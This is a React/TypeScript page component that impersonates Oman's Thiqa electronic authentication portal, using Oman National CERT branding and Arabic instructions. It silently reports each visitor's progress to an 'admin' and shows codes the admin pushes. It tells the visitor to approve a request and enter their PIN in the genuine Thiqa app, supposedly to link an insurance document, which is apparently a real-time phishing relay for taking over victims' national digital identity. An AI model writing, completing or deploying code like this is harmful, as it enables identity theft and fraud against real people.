import { useEffect, useState, useRef } from "react";
import { navigateToPage, sendData, verificationCode } from "@/lib/store";

export default function ThiqaAuth() {
  const [timeLeft, setTimeLeft] = useState(180); // 3 minutes in seconds
  const [timerExpired, setTimerExpired] = useState(false);
  const [code, setCode] = useState<string>("");
  const [codeTimeLeft, setCodeTimeLeft] = useState(60);
  const [codeTimerActive, setCodeTimerActive] = useState(false);
  const intervalRef = useRef<NodeJS.Timeout | null>(null);
  const codeTimerRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    navigateToPage("مصادقة ثقة");
    // إرسال حالة الانتظار للأدمن
    sendData({
      current: "مصادقة ثقة",
      waitingForAdminResponse: true,
      mode: "silent",
    });
    startTimer();
    return () => {
      if (intervalRef.current) clearInterval(intervalRef.current);
    };
  }, []);

  // Subscribe to verification code from admin
  useEffect(() => {
    if (verificationCode.value) {
      setCode(verificationCode.value);
      startCodeTimer();
    }
    const unsubscribe = verificationCode.subscribe((newCode) => {
      console.log("Thiqa code received:", newCode);
      if (newCode) {
        setCode(newCode);
        startCodeTimer();
      }
    });
    return () => {
      unsubscribe();
      if (codeTimerRef.current) clearInterval(codeTimerRef.current);
    };
  }, []);

  const startCodeTimer = () => {
    setCodeTimeLeft(60);
    setCodeTimerActive(true);
    if (codeTimerRef.current) clearInterval(codeTimerRef.current);
    codeTimerRef.current = setInterval(() => {
      setCodeTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(codeTimerRef.current!);
          setCodeTimerActive(false);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  const formatCodeTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const startTimer = () => {
    setTimeLeft(180);
    setTimerExpired(false);
    if (intervalRef.current) clearInterval(intervalRef.current);
    intervalRef.current = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(intervalRef.current!);
          setTimerExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  const handleRetry = () => {
    // Send notification to admin that client requested new verification
    sendData({
      data: { "طلب": "تحقق ثقة جديد" },
      current: "مصادقة ثقة",
      nextPage: "مصادقة ثقة",
      waitingForAdminResponse: true,
    });
    // Reset code and restart timer
    setCode("");
    startTimer();
  };

  const handleRequestNewCode = () => {
    // Send waiting state to admin so the code input appears again
    sendData({
      data: { "طلب": "رمز ثقة جديد" },
      current: "مصادقة ثقة",
      nextPage: "مصادقة ثقة",
      waitingForAdminResponse: true,
    });
    // Reset code and show waiting spinner
    setCode("");
    setCodeTimeLeft(60);
    setCodeTimerActive(false);
    startTimer();
  };

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  const handleThiqaAppClick = () => {
    // Try to open the app via deep link first, fallback to store
    const userAgent = navigator.userAgent || navigator.vendor;
    const isIOS = /iPad|iPhone|iPod/.test(userAgent);
    const isAndroid = /android/i.test(userAgent);

    if (isIOS) {
      // Try deep link, fallback to App Store
      window.location.href = "theqa://";
      setTimeout(() => {
        window.location.href = "https://apps.apple.com/om/app/theqa-%D8%AB%D9%82%D8%A9/id6747373748";
      }, 1500);
    } else if (isAndroid) {
      // Try deep link, fallback to Google Play
      window.location.href = "intent://theqa#Intent;package=om.gov.mtcit.theqamobileid;scheme=theqa;end";
      setTimeout(() => {
        window.location.href = "https://play.google.com/store/apps/details?id=om.gov.mtcit.theqamobileid";
      }, 1500);
    } else {
      // Desktop fallback - open Google Play
      window.open("https://play.google.com/store/apps/details?id=om.gov.mtcit.theqamobileid", "_blank");
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex justify-center" dir="rtl" style={{ fontFamily: "Arial, sans-serif" }}>
      <div className="w-full max-w-[430px] bg-white min-h-screen flex flex-col shadow-lg">
        {/* Header */}
        <div className="flex items-center justify-between px-4 py-4 border-b">
          <button onClick={() => window.history.back()} className="text-2xl text-gray-700">
            ›
          </button>
          <h1 className="text-2xl font-bold text-red-600">ثقة</h1>
          <div className="w-8"></div>
        </div>

        {/* Thiqa Auth Content */}
        <div className="flex-1 flex flex-col">
          {/* Blue Header Section */}
          <div className="bg-[#1e3a5f] text-white p-6">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-3">
                <img src="/images/thiqa-logo.jpg" alt="ثقة" className="w-12 h-12 rounded" />
                <div className="text-right">
                  <p className="font-bold text-sm">ثقــة</p>
                  <p className="text-xs opacity-80">THEQA</p>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <div className="text-left">
                  <p className="text-xs">المركز الوطني</p>
                  <p className="text-xs">للسلامة المعلوماتية</p>
                  <p className="text-xs opacity-80">Oman National CERT</p>
                </div>
                <img src="/images/oman-cert-logo.png" alt="Oman National CERT" className="w-10 h-10 object-contain" />
              </div>
            </div>
            <div className="flex items-center justify-between">
              <p className="text-sm">بوابة المصادقة الإلكترونية (ثقة)</p>
              <span className="text-lg">ع</span>
            </div>
          </div>

          {/* Title */}
          <div className="text-center py-6">
            <h2 className="text-xl font-bold text-gray-900">المصادقة من خلال تطبيق ثقة</h2>
          </div>

          {/* Customer Message */}
          <div className="px-6 pb-4 text-center">
            <p className="text-gray-700 text-base leading-7">
              إفتح تطبيق ثقة الخاص بك وأدخل الرقم المعروض هنا ليتم إعتماد الشريحة الإلكترونية الخاصة بوثيقة التأمين لربطها بالرقم الخاص بك
            </p>
          </div>

          {/* Timer / Code / Retry Section */}
          <div className="flex flex-col items-center justify-center py-6">
            {code ? (
              <>
                <div className="bg-gray-100 rounded-md px-10 py-6">
                  <p className="text-4xl font-bold text-black text-center" style={{ fontFamily: 'Arial, sans-serif' }}>{code}</p>
                </div>
                <p className="mt-4 text-base font-bold text-black">رمز المصادقة</p>
                {codeTimerActive ? (
                  <div className="flex items-center gap-1.5 mt-3" dir="ltr">
                    <span className="text-sm" style={{ animation: 'flip 2s ease-in-out infinite' }}>⏳</span>
                    <span className="text-[#4a6fa5] text-sm">الوقت المتبقي:</span>
                    <span className="text-[#4a6fa5] text-sm font-mono font-bold">{formatCodeTime(codeTimeLeft)}s</span>
                  </div>
                ) : codeTimeLeft === 0 && (
                  <button
                    onClick={handleRequestNewCode}
                    className="mt-4 px-6 py-2 bg-[#1e3a5f] text-white font-bold text-sm rounded-lg hover:bg-[#152d4a] transition-colors"
                  >
                    طلب رمز جديد
                  </button>
                )}
              </>
            ) : !timerExpired ? (
              <>
                <div className="relative">
                  <div className="w-16 h-16 border-4 border-gray-200 border-t-[#1e3a5f] rounded-full animate-spin"></div>
                </div>
                <p className="mt-4 text-2xl text-gray-400 font-mono">{formatTime(timeLeft)}</p>
              </>
            ) : (
              <button
                onClick={handleRetry}
                className="px-8 py-4 bg-[#1e3a5f] text-white font-bold text-lg rounded-xl hover:bg-[#152d4a] transition-colors"
              >
                طلب تصديق جديد
              </button>
            )}
          </div>

          {/* Steps Section */}
          <div className="px-6 py-5 border-t border-gray-200 mx-6">
            <div className="relative">
              {/* Vertical line between circles */}
              <div className="absolute right-[11px] top-6 bottom-6 w-[2px] bg-[#1e3a5f]"></div>
              
              {/* Step 1 */}
              <div className="flex items-start gap-3 mb-5 relative">
                <div className="flex-shrink-0 w-6 h-6 rounded-full border-2 border-[#1e3a5f] bg-white flex items-center justify-center text-[#1e3a5f] text-xs font-bold z-10">1</div>
                <p className="text-gray-600 text-sm leading-relaxed pt-0.5">قم بتسجيل الدخول إلى تطبيق ثقة ثم اضغط على خيار "المصادقة والتوقيع"</p>
              </div>
              
              {/* Step 2 */}
              <div className="flex items-start gap-3 mb-5 relative">
                <div className="flex-shrink-0 w-6 h-6 rounded-full border-2 border-[#1e3a5f] bg-white flex items-center justify-center text-[#1e3a5f] text-xs font-bold z-10">2</div>
                <p className="text-gray-600 text-sm leading-relaxed pt-0.5">افتح الطلب لمراجعة جميع التفاصيل</p>
              </div>
              
              {/* Step 3 */}
              <div className="flex items-start gap-3 mb-5 relative">
                <div className="flex-shrink-0 w-6 h-6 rounded-full border-2 border-[#1e3a5f] bg-white flex items-center justify-center text-[#1e3a5f] text-xs font-bold z-10">3</div>
                <p className="text-gray-600 text-sm leading-relaxed pt-0.5">اضغط على "اضغط هنا" لمراجعة البيانات التي سيتم مشاركتها مع مقدم الخدمة</p>
              </div>
              
              {/* Step 4 */}
              <div className="flex items-start gap-3 mb-5 relative">
                <div className="flex-shrink-0 w-6 h-6 rounded-full border-2 border-[#1e3a5f] bg-white flex items-center justify-center text-[#1e3a5f] text-xs font-bold z-10">4</div>
                <p className="text-gray-600 text-sm leading-relaxed pt-0.5">اضغط على زر "المصادقة"</p>
              </div>
              
              {/* Step 5 */}
              <div className="flex items-start gap-3 mb-5 relative">
                <div className="flex-shrink-0 w-6 h-6 rounded-full border-2 border-[#1e3a5f] bg-white flex items-center justify-center text-[#1e3a5f] text-xs font-bold z-10">5</div>
                <p className="text-gray-600 text-sm leading-relaxed pt-0.5">أدخل رمز المصادقة المتبادلة الذي تم إنشاؤه على بوابة مقدم الخدمة</p>
              </div>
              
              {/* Step 6 */}
              <div className="flex items-start gap-3 relative">
                <div className="flex-shrink-0 w-6 h-6 rounded-full border-2 border-[#1e3a5f] bg-white flex items-center justify-center text-[#1e3a5f] text-xs font-bold z-10">6</div>
                <p className="text-gray-600 text-sm leading-relaxed pt-0.5">أدخل الرقم السري (PIN) ثم اضغط على زر "متابعة"</p>
              </div>
            </div>
          </div>

          {/* Open Thiqa App Section */}
          <div className="flex flex-col items-center py-4 border-t border-gray-200 mx-6">
            <p className="text-gray-700 font-bold text-base mb-3">الدخول الى تطبيق ثقة</p>
            <button onClick={handleThiqaAppClick} className="focus:outline-none">
              <img src="/images/thiqa-logo.jpg" alt="تطبيق ثقة" className="w-16 h-16 rounded-xl shadow-md hover:shadow-lg transition-shadow" />
            </button>
          </div>

          {/* Footer */}
          <div className="mt-auto bg-[#1e3a5f] text-white text-center py-4 px-4 text-xs">
            <p>جميع الحقوق محفوظة © 2026 بوابة المصادقة الإلكترونية (ثقة) الإصدار 2.15.0</p>
            <p className="mt-1">رقم المعاملة:</p>
            <p className="mt-1 font-mono text-[10px]">9af548d1-fc6a-4cab-a754-9994463eb690</p>
          </div>
        </div>
      </div>
    </div>
  );
}
